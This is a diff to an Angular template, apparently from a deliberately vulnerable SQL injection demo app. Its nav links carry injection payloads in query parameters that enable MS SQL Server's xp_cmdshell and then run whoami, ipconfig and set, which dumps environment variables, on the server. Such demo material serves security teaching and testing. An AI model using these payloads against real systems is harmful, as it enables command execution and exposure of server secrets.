@@ -53,7 +53,9 @@
                         <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; RECONFIGURE;--'}">Easy - Get Shell 2</a></li>
                         <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC sp_configure \'xp_cmdshell\', 1;--'}">Easy - Get Shell 3</a></li>
                         <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; RECONFIGURE;--'}">Easy - Get Shell 4</a></li>
-                        <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC xp_cmdshell \'whoami\';--'}">Easy - Shell</a></li>
+                        <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC xp_cmdshell \'whoami\';--'}">Easy - whoami</a></li>
+                        <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC xp_cmdshell \'ipconfig\';--'}">Easy - ipconfig</a></li>
+                        <li><a class="nav-link" routerLink="/sqli/easy" [queryParams]="{ firstName: '\'; EXEC xp_cmdshell \'set\';--'}">Easy - set</a></li>
                     </ul>
                 </section>
             </section>
